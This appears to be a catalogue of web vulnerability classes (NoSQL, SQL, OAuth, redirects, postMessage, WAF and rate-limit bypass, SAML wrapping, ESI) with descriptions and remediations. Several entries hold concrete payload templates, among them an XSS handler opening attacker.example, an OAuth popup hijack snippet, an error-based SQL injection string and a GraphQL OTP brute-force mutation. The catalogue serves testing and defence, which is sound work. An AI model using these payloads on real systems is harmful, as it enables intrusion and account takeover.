description: API endpoints that bind user-supplied JSON directly to server-side models without an allow-list permit unauthorized modification of privileged fields like roles or status, enabling vertical privilege escalation.
remediation: Use strict allow-lists for model binding and enforce server-side authorization checks for privileged fields.

title: Unauthenticated blind NoSQL injection via Meteor method selector
description: Unauthenticated attackers could inject operators like $where with sleep() into a MongoDB selector forwarded via Meteor's listEmojiCustom method, creating a timing oracle to exfiltrate documents.
remediation: Validate selector shape and strip dangerous operators before passing to find().

title: Mongoose populate().match search injection via top-level operator
description: Attackers could inject $where operators into populate({ match: ... }) by controlling the match object, enabling arbitrary JavaScript execution in MongoDB queries.
remediation: Use allow-lists and map scalars explicitly instead of forwarding the whole request object.

title: Mongoose nested $where injection in populate().match via $or
description: Bypass of CVE-2024-53900 where $where is nested under operators such as $or in Mongoose populate filters, enabling code execution.
remediation: Apply sanitizeFilter and validate nested operator objects explicitly.

title: NoSQL authentication bypass using $ne, $gt, $regex, or $exists
description: Injecting operators like $ne, $gt, $regex, or $exists into login fields can bypass authentication by matching non-existent or truthy values.
remediation: Strip or reject keys starting with $ and validate input types strictly.

title: MongoDB $where clause JavaScript injection
description: Injecting JavaScript into $where clauses allows arbitrary code execution or data exfiltration via server-side JS evaluation.
remediation: Disable server-side JavaScript with --noscripting or security.javascriptEnabled: false.

title: NoSQL regex-based data extraction via $regex operator
description: Using $regex operator to brute-force or extract data character-by-character from MongoDB fields.
remediation: Sanitize regex patterns and restrict operator usage.

title: Data exfiltration via $lookup aggregation operator
description: Abusing $lookup in aggregation pipelines to join and extract data from unrelated collections.
remediation: Avoid using attacker-controlled objects in aggregation pipelines; use allow-lists.

title: Arbitrary function execution via $func operator in MongoLite
description: Injecting $func operator to execute arbitrary JavaScript functions in MongoLite library, leading to RCE.
remediation: Disable or patch MongoLite; avoid using $func operator.

title: GraphQL filter confusion leading to NoSQL injection
description: Forwarding untrusted GraphQL filter arguments directly into MongoDB queries enables NoSQL injection via operators like $ne.
remediation: Recursively strip keys starting with $ or validate with schema libraries.

title: Syntax injection in MongoDB queries via string concatenation
description: When MongoDB filters are built as strings before parsing, attackers can inject JavaScript or override constraints using poison null bytes or duplicate keys.
remediation: Parse queries as structured objects; avoid string concatenation.

title: Error-based NoSQL injection via $where clause
description: Injecting throw statements in $where clauses to exfiltrate full documents via server-side JavaScript errors.
remediation: Disable server-side JavaScript and suppress error details.

title: Open redirect_uri parameter in OAuth
description: Weak validation of the redirect_uri parameter allows attackers to redirect OAuth authorization codes to attacker-controlled endpoints, enabling token theft and account takeover.
remediation: Validate redirect_uri strictly against a pre-registered whitelist of exact URLs, reject non-HTTPS URIs, and normalize paths before comparison.

title: Redirect token leakage via attacker-controlled subpaths
description: Allowlisted domains with attacker-controlled paths can leak OAuth tokens via URL parameters or Referer headers, enabling token replay attacks despite domain validation.
remediation: Avoid placing sensitive tokens in URLs; use HTTP-only cookies or server-side sessions for token storage and transmission.

title: XSS via reflected redirect URL in OAuth callback
description: OAuth callback pages reflecting user-controlled redirect URLs can be exploited for reflected XSS, allowing session hijacking or account takeover when combined with OAuth flows.
remediation: Strictly validate and sanitize all redirect URLs; use Content Security Policy to restrict inline scripts and unsafe sources.

title: Reflected error_description and state leakage in OAuth callback error pages
description: OAuth error callback pages reflecting error_description or state parameters can be abused for phishing or PII leakage, especially when combined with browser-specific event handlers.
payload_templates: <body onpagereveal=open('https://attacker.example')>This step can only be completed in Safari
oracle_hints: malicious HTML rendered in error page
remediation: Encode all error parameters strictly; avoid reflecting user-controlled data in error pages; decode state safely and validate before use.

title: CSRF via improper state parameter handling in OAuth
description: Improper generation, validation, or binding of the state parameter allows attackers to forge OAuth authorization requests, linking victim accounts to attacker-controlled identity provider profiles.
oracle_hints: victim account linked to attacker identity
remediation: Generate a cryptographically random state per session, bind it to the user session, and validate it strictly on callback.

title: Basic open redirect via unvalidated redirect parameter
description: Unvalidated user input in redirect parameters allows attackers to redirect users to arbitrary domains. Common in web apps using parameters like 'next', 'url', or 'redirect'.
oracle_hints: Location header points to attacker domain
remediation: Validate redirect targets against a strict allowlist of trusted domains and paths.

title: Open redirect to loopback or internal addresses via IP/hostname variants
description: Applications allowing only internal hosts can be bypassed using loopback IP variants, IPv6, or wildcard DNS that resolves to 127.0.0.1.
oracle_hints: Redirect leads to localhost or internal service
remediation: Strictly validate redirect targets against a predefined allowlist of domains and IPs.

title: Open redirect via userinfo tricks in URLs
description: Userinfo in URLs (e.g., user:pass@host) can bypass naive host validators by making the trusted domain appear in the userinfo portion.
oracle_hints: Location header contains attacker domain despite trusted.tld in userinfo
remediation: Parse and validate the host portion of URLs separately from userinfo.

title: Open redirect via regex/glob matching flaws in allowlists
description: Regex or glob-based allowlists for redirect URIs can be bypassed using metacharacters (e.g., dots as wildcards) or path traversal.
oracle_hints: Redirect URI accepted despite not being in allowlist
remediation: Use exact string comparison or strict domain validation instead of regex/glob patterns.

title: Open redirect via malicious SVG file upload
description: SVG files with embedded JavaScript or meta refresh tags can redirect users when the file is loaded in a browser context.
oracle_hints: SVG file triggers redirect on load
remediation: Sanitize SVG uploads or restrict to safe formats without scripting.

title: Open redirect via fragment smuggling and path traversal
description: Fragment (#) or encoded path traversal in redirect parameters can bypass server-side validation, leading to redirects to external domains.
oracle_hints: Redirect includes fragment or traversal leading to attacker domain
remediation: Validate the entire URL path and fragment separately, decode and sanitize before redirection.

title: Open redirect to XSS via javascript: scheme
description: Unvalidated redirect parameters accepting javascript: URIs can lead to stored or reflected XSS when user clicks the link.
oracle_hints: XSS payload executes in browser context
remediation: Block javascript:, data:, and vbscript: schemes in redirect targets.

title: Django ORM Injection via dynamic filter parameters
description: Django ORM allows attackers to inject arbitrary filter parameters via request.data, enabling data leakage through relational traversal, password brute-forcing, and bypass of security filters.
remediation: Avoid passing raw request data to ORM filters; use explicit field whitelists and parameterized queries.

title: Beego ORM Injection via filter expression manipulation
description: Beego ORM's Filter method allows attackers to craft malicious filter expressions that traverse relations and leak sensitive data via list responses, pagination metadata, or response lengths.
remediation: Validate and sanitize filter expressions; restrict traversal depth and sensitive field access.

title: Prisma ORM Injection via unchecked filter and include clauses
description: Prisma ORM allows attackers to inject arbitrary filter, include, and select clauses via request body, enabling full data leakage through nested relations and bypass of published filters.
remediation: Avoid passing raw request data to Prisma queries; use strict schema validation and field-level access controls.

title: HTTP Parameter Pollution (HPP)
description: Manipulating HTTP parameters by adding, modifying, or duplicating them to alter application behavior. Exploits vary by framework due to differing parameter parsing rules.
remediation: Implement strict parameter parsing that rejects duplicate keys or normalizes input consistently.

title: JSON Key Collision via Duplicate or Truncated Keys
description: Exploiting inconsistent handling of duplicate or truncated JSON keys where frontend and backend interpret keys differently, enabling bypass of restrictions or privilege escalation.
remediation: Use strict JSON parsers that reject duplicate keys or enforce consistent key handling.

title: JSON Comment Truncation Bypass
description: Abusing comment syntax in JSON to truncate keys or values, causing different interpretations between parsers and enabling bypass of security checks.
remediation: Disable comment support in JSON parsers or use strict parsers that ignore comments.

title: JSON Number Representation Inconsistency
description: Exploiting inconsistencies in parsing large numbers in JSON, where different parsers may decode the same number to different values.
remediation: Validate and sanitize numeric inputs to ensure consistent parsing across all components.

title: CRLF Injection via HTTP header injection
description: Injecting CRLF sequences (%0d%0a) into input to split HTTP headers and inject malicious content such as XSS payloads or redirects. This can lead to response splitting or header injection attacks.
remediation: Sanitize and validate all user inputs, especially those reflected in HTTP headers.

title: Command Injection via shell metacharacters
description: Injecting shell metacharacters (;, ||, |, &&, %, backticks, $()) into input to execute arbitrary commands on the server. This can lead to full system compromise.
remediation: Use language-specific safe APIs for command execution and avoid shell=True.

title: Dangling Markup Injection
description: Injecting partial or malformed HTML markup to exfiltrate sensitive data from the page via error messages or partial DOM states. Often used when full XSS is not possible.
remediation: Implement strict output encoding and context-aware sanitization.

title: Path Traversal via ../ sequences
description: Injecting ../ sequences or absolute paths to access files outside the intended directory. This can lead to reading sensitive files or remote file inclusion.
remediation: Use absolute paths and validate/sanitize user input for file operations.

title: Open Redirect via user-controlled URLs
description: Injecting URLs or domains that redirect users to attacker-controlled sites. Often used in phishing or session hijacking attacks.
remediation: Validate and sanitize all redirect targets, use allowlists.

title: Regular Expression Denial of Service (ReDoS)
description: Injecting malicious regex patterns that cause excessive backtracking, leading to denial of service on the server. This can crash or slow down the application.
remediation: Use efficient regex patterns and avoid catastrophic backtracking.

title: Server Side Include (SSI) Injection
description: Injecting SSI directives to execute server-side commands or include external content. This can lead to remote code execution or data exfiltration.
remediation: Disable SSI if not needed and sanitize user input used in SSI directives.

title: Server Side Template Injection (SSTI)
description: Injecting template expressions to execute arbitrary code on the server. This can lead to remote code execution depending on the template engine.
remediation: Use safe template engines and sandboxed environments for dynamic content.

title: XSLT Server Side Injection
description: Injecting malicious XSLT stylesheets to execute arbitrary code or access internal resources. This can lead to remote code execution or data exfiltration.
remediation: Disable dangerous XSLT features and validate stylesheets.

title: Cross-Site Scripting (XSS) via reflected input
description: Injecting JavaScript code into web pages viewed by other users. This can lead to session hijacking, defacement, or malware delivery.
remediation: Implement context-aware output encoding and use CSP headers.

title: Reflected Cross-Site Scripting (XSS)
description: Injecting malicious scripts into web pages viewed by other users. Payloads execute in the context of the victim's browser.
remediation: Sanitize user input and use Content Security Policy (CSP).

title: PostMessage origin validation bypass via wildcard targetOrigin
description: If a page uses postMessage with a wildcard targetOrigin (*), attackers can send malicious messages to any domain by modifying the iframe origin. This can lead to XSS or sensitive data leakage if the receiving page processes messages unsafely.
remediation: Validate targetOrigin strictly against a whitelist of allowed origins instead of using wildcards.

title: Missing or weak origin validation in addEventListener for postMessage
description: If a page uses addEventListener to handle postMessage without proper origin validation or with weak validation methods (e.g., indexOf, search, match), attackers can send arbitrary messages and trigger sensitive actions.
remediation: Implement strict origin validation using exact string comparison or trusted domain lists.

title: Prototype pollution via postMessage leading to XSS
description: If postMessage payloads are processed without proper sanitization, attackers can inject properties into Object.prototype via __proto__ or constructor.prototype, leading to XSS or privilege escalation.
remediation: Sanitize postMessage payloads and avoid prototype property assignments.

title: Bypass origin check via null origin in sandboxed iframes
description: In sandboxed iframes with allow-popups but without allow-popups-to-escape-sandbox, both sender and receiver have null origin. This allows bypassing origin checks where e.origin == window.origin evaluates to true.
remediation: Avoid relying on origin checks in sandboxed contexts; use additional validation mechanisms.

title: Bypass e.source validation by deleting iframe immediately after postMessage
description: Attackers can force e.source to be null by creating an iframe that sends a postMessage and is immediately deleted, bypassing source-based validation checks.
remediation: Avoid relying solely on e.source for security checks; use origin validation instead.

title: Abuse of trusted relay endpoints via postMessage to bypass origin checks
description: If a trusted origin has a relay endpoint that echoes attacker-controlled parameters via postMessage, attackers can spoof message types and trigger privileged behaviors by leveraging the trusted origin.
remediation: Validate all message contents and enforce strict type checks on trusted relays.

title: PostMessage race condition via synchronous blocking gadgets
description: A race condition allows a malicious child document (iframe/popup) to register an onmessage handler before the parent sends sensitive data via postMessage. The parent is stalled using synchronous gadgets like loose comparison or loops over attacker-controlled data.
remediation: Use strict equality (===) in message handlers and avoid synchronous loops over attacker-controlled data.

title: Bypassing SOP by forcing null origin via sandboxed iframe
description: Embedding a page in a sandboxed iframe with allow-scripts sets window.origin to null, allowing origin checks to be bypassed. This enables XSS payloads to execute despite Same-Origin Policy protections.
remediation: Avoid relying solely on origin checks; use Content Security Policy and avoid unsafe DOM manipulation methods like innerHTML.

title: Bypassing SOP with null-origin iframes via DOM clobbering and postMessage
description: Attackers can bypass Same-Origin Policy checks by forcing iframes into a null origin through sandboxing and DOM clobbering, enabling postMessage abuse and HTML injection via innerHTML sinks.
remediation: Use strict origin checks with ===, sanitize HTML before innerHTML assignment, and avoid DOM clobbering vectors.

title: OAuth popup hijacking via sandboxed iframes with allow-popups
description: Sandboxed iframes with allow-popups grant popups a null origin, allowing attackers to forge postMessage interactions and hijack OAuth flows despite origin checks.
payload_templates: frame.sandbox = 'allow-scripts allow-popups'; const pop = open('https://oauth.example/callback'); pop.postMessage({ cmd: 'getLoginCode' }, '*');
remediation: Avoid granting allow-popups in sandboxed iframes and enforce strict origin validation in popup handlers.

title: X-Frame-Options bypass via window.open and postMessage
description: Pages protected by X-Frame-Options: DENY can still be interacted with by launching them via window.open and posting messages after navigation, bypassing frame restrictions.
payload_templates: const victim = open('https://target-app/'); setTimeout(() => { probe.contentWindow.postMessage(payload, '*'); probe.remove(); }, 500);
remediation: Use Content-Security-Policy frame-ancestors instead of X-Frame-Options and validate postMessage origins strictly.

title: Pathname manipulation to bypass Nginx ACL rules
description: Nginx normalizes paths before ACL checks, but backend servers may normalize differently. Attackers can use Unicode or special characters to bypass path-based access controls.
remediation: Use case-insensitive regex patterns for path matching (e.g., location ~* ^/admin).

title: ModSecurity path confusion via URL-encoded characters
description: ModSecurity v3 improperly decoded URL-encoded characters in paths, causing REQUEST_FILENAME to misrepresent the actual path. Attackers could bypass path-based protections by encoding special characters.
remediation: Upgrade ModSecurity to versions fixing path parsing inconsistencies.

title: AWS WAF bypass via malformed HTTP headers
description: AWS WAF failed to parse malformed headers correctly, allowing attackers to smuggle payloads in headers that the backend server processed. The WAF and backend disagreed on header parsing rules.
remediation: Ensure WAF and backend use consistent header parsing logic.

title: Multipart/form-data parser differential WAF bypass
description: WAFs and backends may parse multipart/form-data differently, allowing attackers to craft requests where the WAF inspects a harmless interpretation while the backend processes the real payload.
remediation: Ensure WAF and backend use identical multipart parsing libraries and configurations.

title: WAF bypass via request size limits
description: WAFs often limit the size of inspected requests. Attackers can send oversized requests to bypass inspection entirely, as the WAF stops checking after the limit.
remediation: Increase WAF request size limits or enforce consistent size checks.

title: Static asset inspection gaps in WAF/CDN
description: WAFs/CDNs often apply weaker or no content inspection to GET requests for static assets (e.g., .js files), allowing attackers to smuggle payloads via untrusted headers.
remediation: Apply consistent inspection rules to all request types, including static assets.

title: WAF bypass via obfuscation techniques
description: Attackers can obfuscate payloads using encoding, Unicode, or alternative syntax to bypass WAF signature-based detection.
remediation: Implement context-aware normalization and signature updates.

title: WAF bypass via Unicode normalization
description: WAFs may normalize Unicode characters inconsistently, allowing attackers to use compatible characters to bypass filters and execute payloads.
remediation: Normalize input to a consistent Unicode form (e.g., NFKC) before inspection.

title: Rate limit bypass via endpoint variations
description: Brute forcing variations of targeted endpoints (e.g., different versions, capitalizations) to evade rate limiting by exploiting endpoint recognition flaws.
remediation: Implement consistent endpoint normalization and enforce strict routing rules.

title: Rate limit bypass via blank character injection
description: Inserting blank bytes (e.g., %00, %0d%0a, %20) into parameters to evade rate limiting by altering input recognition.
remediation: Sanitize and normalize input to remove control characters before processing.

title: Rate limit bypass via IP spoofing headers
description: Modifying headers like X-Forwarded-For or X-Originating-IP to spoof the client IP and evade IP-based rate limiting.
remediation: Avoid trusting client-supplied IP headers; use server-side connection metadata.

title: Rate limit bypass via header tampering
description: Altering headers such as User-Agent or cookies to evade rate limiting by changing request fingerprints.
remediation: Implement robust session and header validation to prevent fingerprint evasion.

title: Rate limit bypass via parameter variation in API gateways
description: Adding non-significant parameters to requests to make each request appear unique and evade gateway-based rate limiting.
remediation: Enforce strict parameter validation and normalize request signatures.

title: Rate limit bypass via account/session rotation
description: Rotating accounts or sessions to reset rate limit counters, especially useful for login or OTP brute-forcing.
remediation: Implement per-account rate limiting with global tracking to prevent rotation bypasses.

title: Rate limit bypass via proxy networks
description: Using proxy networks to distribute requests across multiple IPs and evade IP-based rate limiting.
remediation: Detect and block proxy traffic; implement IP reputation checks.

title: Rate limit bypass via HTTP/2 multiplexing
description: Abusing HTTP/2 multiplexing to send multiple requests over a single connection, bypassing per-request rate limiting.
remediation: Implement rate limiting based on HTTP/2 streams rather than connections.

title: Rate limit bypass via GraphQL aliases and batched operations
description: Using GraphQL aliases to send multiple queries in a single request, evading rate limiting by exploiting batching behavior.
payload_templates: mutation bruteForceOTP { a: verify(code:"111111") { token } b: verify(code:"222222") { token } }
remediation: Apply rate limiting at the GraphQL operation level, not just the request level.

title: Rate limit bypass via bulk/REST batch endpoints
description: Abusing bulk or batch REST endpoints to send multiple operations in a single request, bypassing per-request rate limiting.
remediation: Enforce strict rate limiting on bulk endpoints and validate individual operations.

title: Rate limit bypass via sliding-window timing
description: Timing requests to fire bursts just before rate limit window resets to maximize throughput.
remediation: Use fixed-window or token-bucket algorithms with jitter to prevent timing attacks.

title: Rate limit bypass via WebSocket/gRPC streaming
description: Exploiting WebSocket or gRPC streaming to send multiple messages over a single connection, bypassing per-request rate limiting.
remediation: Apply rate limiting to WebSocket/gRPC frames, not just the initial handshake.

title: Rate limit bypass via CDN PoP-sharded counters
description: Abusing CDN PoP-local rate limit counters by routing requests through multiple data centers to multiply allowed throughput.
remediation: Implement global rate limiting counters across all PoPs.

title: Duplicate registration via email canonicalization tricks
description: Abuse email canonicalization to bypass uniqueness checks, obtain duplicate accounts, or block victim sign-ups via temporary DoS during registration.
remediation: Enforce strict email normalization and uniqueness checks before account creation.

title: Regular Expression Denial of Service via backtracking
description: Crafted inputs trigger exponential or high-polynomial backtracking in backtracking-based regex engines (PCRE, Java, Python, JavaScript), causing severe performance degradation or denial of service.
remediation: Replace backtracking regex engines with linear-time alternatives like RE2 or Rust regex for untrusted input.

title: Password reset token leak via Referer header
description: Password reset tokens may be leaked via the HTTP Referer header when users click third-party links after requesting a reset. This can enable account takeover via CSRF.
remediation: Strip reset tokens from URLs and avoid including them in Referer headers.

title: Password reset poisoning via Host header manipulation
description: Manipulating the Host header during password reset requests can cause the reset link to point to a malicious domain, leaking tokens to attackers.
remediation: Validate Host header against a whitelist and use server-side methods to generate absolute URLs.

title: Password reset email parameter manipulation
description: Adding duplicate or crafted email parameters in password reset requests can divert reset links to attacker-controlled addresses.
remediation: Parse and validate email parameters server-side; use prepared statements to prevent injection.

title: Changing email and password of any user through API parameters
description: Modifying email and password parameters in API requests can allow attackers to change credentials for any account.
remediation: Enforce strict parameter validation and authentication checks on API endpoints.

title: No rate limiting: email bombing via password reset
description: Lack of rate limiting on password reset requests can overwhelm users with reset emails, enabling denial-of-service.
remediation: Implement rate limiting based on IP or account and use CAPTCHA challenges.

title: Predictable password reset token generation
description: Password reset tokens generated using predictable patterns (e.g., timestamps, user IDs) can be brute-forced or predicted.
remediation: Use strong cryptographic methods with sufficient randomness and length for token generation.

title: Guessable UUID version 1 tokens in password reset
description: Version 1 UUIDs used as reset tokens are time-based and can be brute-forced if not sufficiently randomized.
remediation: Use GUID version 4 or implement additional security measures for other versions.

title: Response manipulation to bypass restrictions
description: Manipulating HTTP responses can bypass error messages or restrictions, potentially enabling unauthorized actions.
remediation: Implement server-side checks to ensure response integrity and use secure communication channels.

title: Reuse of expired password reset tokens
description: Expired password reset tokens may still be accepted, allowing unauthorized account access.
remediation: Implement strict token expiration policies and validate expiry server-side.

title: Brute forcing password reset tokens
description: Attackers may brute-force reset tokens using tools like Burp Suite and IP rotation to bypass rate limits.
remediation: Implement robust rate-limiting, account lockout, and monitor for brute-force attempts.

title: Using attacker token with victim email for password reset
description: Testing if an attacker's reset token can be used in conjunction with the victim's email to reset the password.
remediation: Bind tokens to user sessions or other user-specific attributes.

title: Session invalidation failure on logout or password reset
description: Sessions are not properly invalidated during logout or password reset, allowing continued access.
remediation: Implement proper session management to invalidate all sessions upon logout or password reset.

title: OTP rate limit bypass by changing session
description: Changing session tokens resets OTP attempt counters, enabling brute-force attacks on weak OTPs.
remediation: Bind OTP attempts to persistent sessions and enforce rate limits across sessions.

title: Arbitrary password reset via skipOldPwdCheck pre-auth
description: Password change endpoints accepting skipOldPwdCheck=true without token verification allow pre-auth arbitrary account reset.
remediation: Require valid reset tokens and enforce ownership checks before allowing password changes.

title: Reverse Tab Nabbing via window.opener manipulation
description: An attacker controls the href of an <a> tag with target='_blank' and rel='opener' to open a malicious site that can modify the original page via window.opener. This can be used to redirect the original page to a phishing site.
remediation: Use rel='noopener noreferrer' or rel='noreferrer' on target='_blank' links.

title: RSQL Injection via unsanitized filter parameters
description: Improperly sanitized RSQL filter parameters allow attackers to inject malicious RSQL expressions, enabling unauthorized data access, modification, or deletion via the RESTful API.
remediation: Use parameterized queries or a whitelist of allowed operators/values for RSQL filters.

title: RSQL-based user enumeration via registration endpoint
description: An RSQL filter on a registration endpoint leaks user existence via different response content or status codes when a valid email is provided.
remediation: Return consistent responses regardless of email existence and disable RSQL in sensitive endpoints.

title: RSQL-based authorization bypass via role manipulation
description: Injecting RSQL filters to bypass role-based access control by forcing conditions that grant unauthorized access to privileged data or actions.
remediation: Validate user permissions server-side after RSQL parsing and enforce strict allowlists.

title: XML round-trip parsing discrepancy leading to signature bypass
description: XML parsers may alter document structure during serialization, causing signature validation to check a different subtree than the application logic. This allows attackers to bypass integrity protections by crafting XML that parses differently before and after signature checks.
remediation: Use canonicalization and strict schema validation; avoid re-parsing signed XML.

title: XML Signature Wrapping Attack Type 1: New root element with signature
description: Attacker adds a new root element containing a valid signature while duplicating the original assertion elsewhere. The validator checks the signature on the new root, but the application logic processes the original assertion, allowing arbitrary content injection.
remediation: Validate that signed elements match those processed by application logic; enforce strict XPath constraints.

title: XML Signature Wrapping Attack Type 2: Detached signature variant
description: Uses a detached signature to create a parallel structure where the validator checks the detached signature but the application logic processes a duplicated assertion, bypassing integrity protections.
remediation: Ensure signed data corresponds to the processed assertion; avoid detached signatures in SAML.

title: XML Signature Wrapping Attack Type 3: Duplicate assertion at same level
description: Injects a malicious assertion at the same hierarchy level as the original, causing the application to process the attacker-controlled assertion while the signature remains valid on the original.
remediation: Validate that only one assertion exists and matches the signed data.

title: XML Signature Wrapping Attack Type 4: Original assertion nested under evil assertion
description: The original assertion becomes a child of the duplicated malicious assertion, tricking the validator into checking the outer structure while the application processes the inner original assertion.
remediation: Reject nested assertions; enforce flat assertion structures.

title: XML Signature Wrapping Attack Type 5: Non-standard signature wrapping
description: Uses non-standard configurations where the copied assertion envelopes the signature, altering expected document structure to bypass validation while maintaining signature integrity.
remediation: Enforce strict canonicalization and schema validation for SAML messages.

title: XML Signature Wrapping Attack Type 6: Nested evil assertion enveloping signature and original
description: Creates a nested structure where the copied assertion envelopes the signature, which in turn envelopes the original assertion, allowing the attacker to control processed content despite a valid signature.
remediation: Flatten assertion structures; avoid nested enveloping signatures.

title: XML Signature Wrapping Attack Type 7: Exploiting Extensions element to bypass schema validation
description: Inserts a copied assertion as a child of the Extensions element, exploiting less restrictive schema validation in libraries like OpenSAML to bypass integrity checks and inject malicious content.
remediation: Enforce strict schema validation; reject assertions in Extensions elements.

title: XML Signature Wrapping Attack Type 8: Reversed Extensions-based wrapping
description: Reverses the structure of XSW #7 by making the original assertion a child of a less restrictive element, allowing the attacker to inject malicious content while maintaining a valid signature.
remediation: Reject assertions nested under Extensions; enforce strict XPath matching.

title: Ruby-SAML signature verification bypass via forged assertion
description: Vulnerable Ruby-SAML implementations allow attackers with any IdP-signed SAMLResponse to forge a new assertion and authenticate as arbitrary users by rewriting signature references and digests while maintaining signature validity.
remediation: Upgrade Ruby-SAML to patched versions; enforce strict assertion validation.

title: XXE in SAML Responses via malformed XML structure
description: SAML Responses are XML documents that can be manipulated to include external entity declarations, enabling attackers to read local files or trigger SSRF via XXE when the XML parser processes the doctype.
remediation: Disable DTD processing and external entities in XML parsers; use secure XML libraries.

title: XSLT injection via SAML Response before signature validation
description: XSLT transformations are performed before signature verification in some SAML implementations. Attackers can inject malicious XSLT stylesheets to exfiltrate data or achieve RCE via functions like unparsed-text().
remediation: Disable XSLT processing in SAML libraries; validate signatures before transformation.

title: XML Signature Exclusion bypassing signature validation
description: SAML implementations that do not require the Signature element may skip signature validation entirely. Attackers can remove signatures and inject arbitrary content that the application processes without integrity checks.
remediation: Enforce mandatory signature presence and validation in SAML messages.

title: Certificate faking to test SAML trust validation
description: Attackers use self-signed certificates to sign SAML Responses or Assertions to test whether the Service Provider properly verifies the signing certificate against trusted Identity Providers.
remediation: Enforce strict certificate chain validation against trusted IdP certificates.

title: Server Side Include (SSI) Remote Command Execution
description: SSI directives allow server-side execution of arbitrary commands via the <!--#exec cmd="..."--> tag. Attackers can inject malicious commands to achieve remote code execution on the server.
remediation: Disable SSI or restrict SSI directives to trusted content. Use modern templating engines instead.

title: Server Side Include (SSI) File Inclusion
description: SSI allows inclusion of arbitrary files via <!--#include virtual="..."--> or <!--#include file="..."--> directives. Attackers can read sensitive files or include malicious content.
remediation: Disable SSI or restrict file inclusion to trusted directories. Use modern templating engines.

title: Edge Side Include (ESI) Injection
description: ESI tags allow injection of arbitrary content into cached responses. Attackers can inject malicious scripts or steal cookies via ESI directives.
remediation: Sanitize ESI tags in user input. Disable ESI if not required. Use modern caching mechanisms.

title: ESI-based XSS Filter Bypass
description: ESI directives can bypass client-side XSS protections by splitting or encoding malicious payloads within ESI tags.
remediation: Implement server-side XSS protections. Sanitize ESI tags in user input.

title: ESI-based Cookie Theft
description: ESI can reflect or exfiltrate HTTP cookies via <!--esi $(HTTP_COOKIE)--> or <esi:include src="..."> tags, bypassing HttpOnly flags.
remediation: Set HttpOnly and Secure flags on cookies. Sanitize ESI tags in user input.

title: ESI-based Open Redirect
description: ESI can inject Location headers via <!--esi $add_header('Location','...')--> to redirect users to arbitrary URLs.
remediation: Sanitize ESI tags in user input. Validate redirect URLs.

title: ESI-based Header Injection
description: ESI can inject arbitrary headers into responses via <!--esi $add_header('...','...')--> or <esi:request_header> tags, potentially bypassing security controls.
remediation: Sanitize ESI tags in user input. Restrict header injection capabilities.

title: ESI-based CRLF Injection
description: ESI can inject CRLF sequences via <esi:request_header> tags, leading to HTTP header injection and potential session hijacking.
remediation: Sanitize ESI tags in user input. Restrict header injection capabilities.

title: ESI + XSLT XXE Injection
description: ESI combined with XSLT can enable XML External Entity (XXE) attacks via <esi:include> with dca="xslt" and stylesheet parameters.
remediation: Disable XSLT processing in ESI. Sanitize ESI tags in user input.

title: ESI Debug Information Exposure
description: ESI debug tags like <esi:debug/> can expose sensitive debugging information in responses, aiding further exploitation.
remediation: Disable ESI debug mode in production. Restrict debug access.

title: SOAP/JAX-WS ThreadLocal Authentication Bypass via Stale Subject Reuse
description: Middleware caches authenticated Subject in a static ThreadLocal and only refreshes it when a proprietary SOAP header is present. WebLogic/JBoss/GlassFish worker threads reuse stale privileged contexts when the header is omitted, allowing unauthenticated access to protected operations.
remediation: Clear ThreadLocal SubjectHolder after each request and enforce header presence checks in all handlers.

title: Basic SQL Injection via logical or mathematical operations
description: Allows attackers to interfere with database queries by injecting SQL logic or mathematical operations into input parameters, potentially accessing or modifying unauthorized data.
remediation: Use parameterized queries or prepared statements with proper input validation.

title: Time-based Blind SQL Injection
description: Exploits delays in query execution to infer database content when direct output is unavailable, by causing the database to perform time-consuming operations.
oracle_hints: delayed page load when condition is true
remediation: Use parameterized queries, input validation, and database-level protections against time-based attacks.

title: Union-based SQL Injection
description: Combines results of injected SELECT statements with original query output by leveraging UNION clauses, enabling data exfiltration from other tables.
oracle_hints: additional data rows in query output
remediation: Use parameterized queries with strict type checking and limit query output to expected results.

title: Error-based SQL Injection
description: Forces database errors to leak sensitive information through error messages when direct query output is unavailable.
payload_templates: (select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
oracle_hints: database error messages containing sensitive data
remediation: Disable detailed error messages in production and use parameterized queries.

title: Boolean-based Blind SQL Injection
description: Infers database content by observing differences in page content based on true/false conditions in injected SQL logic.
oracle_hints: different page content for true vs false conditions
remediation: Use parameterized queries and implement proper output encoding.

title: Error Blind SQL Injection
description: Distinguishes database content by forcing SQL errors when conditions are met, detectable through server crashes or error responses.
oracle_hints: SQL errors when guessed character is correct
remediation: Use parameterized queries and disable detailed error messages.

title: Stacked SQL Injection
description: Executes multiple SQL statements in sequence by injecting semicolon-separated queries, useful for blind vulnerabilities and command execution.
remediation: Use parameterized queries and strict input validation to prevent multiple statements.

title: Database Management System Identification via SQL functions
description: Identifies the backend DBMS by executing version-specific functions and comparing results, aiding in targeted exploitation.
oracle_hints: successful function execution indicates DBMS type
remediation: Implement database-agnostic query construction and avoid DBMS-specific functions.

title: Cypher Injection in Neo4j
description: Improperly sanitized user input is concatenated into Cypher queries, allowing attackers to manipulate graph database queries. This can lead to unauthorized data access, modification, or deletion.
payload_templates: UNWIND range(1,100000) AS x RETURN x
remediation: Use parameterized queries or prepared statements with Neo4j drivers.

title: MS Access SQLi via string concatenation operators
description: MS Access supports string concatenation via & and + operators. Attackers can inject these to combine strings in UNION queries.
remediation: Use parameterized queries and input validation.

title: MS Access SQLi via NULL byte query truncation
description: Appending a NULL byte (%00) can truncate the original query in MS Access, allowing attackers to inject their own SQL.
remediation: Use parameterized queries and input validation.

title: MS Access SQLi via TOP/LAST operators for result limiting
description: MS Access lacks LIMIT but supports TOP and LAST to restrict result rows. Attackers can abuse these in UNION queries to control output.
payload_templates: 1' UNION SELECT TOP 3 attr FROM table%00
remediation: Use parameterized queries and input validation.

title: MS Access SQLi requiring FROM clause in subqueries
description: MS Access requires a valid FROM clause in UNION or subqueries. Attackers must know or guess a table name to exploit.
remediation: Use parameterized queries and input validation.

title: MS Access SQLi via chaining equals boolean injection
description: MS Access allows chaining equals like '1'=2='3'='asd'=false. Attackers can use this in WHERE clauses with Mid to exfiltrate data via boolean conditions.
remediation: Use parameterized queries and input validation.

title: MS Access SQLi table name brute-forcing via boolean injection
description: Attackers can brute-force table names using chaining equals or traditional methods with TOP 1 to test existence.
remediation: Use parameterized queries and input validation.

title: MS Access SQLi column name brute-forcing via boolean injection
description: Attackers can brute-force column names using chaining equals, GROUP BY, or subqueries with TOP 1.
remediation: Use parameterized queries and input validation.

title: MS Access SQLi via IIF, Mid, and LAST for data dumping
